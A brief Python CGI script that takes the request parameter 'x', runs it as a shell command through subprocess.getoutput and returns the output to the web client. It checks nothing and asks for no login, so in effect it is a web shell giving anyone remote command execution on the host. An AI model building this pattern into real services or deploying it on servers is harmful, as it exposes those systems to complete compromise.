#!/usr/bin/python3

import cgi
import subprocess as sp

print("content-type: text/html")
print()

y=cgi.FieldStorage()
cmd = y.getvalue("x")

print(cmd)

x=sp.getoutput(cmd)
print(x)
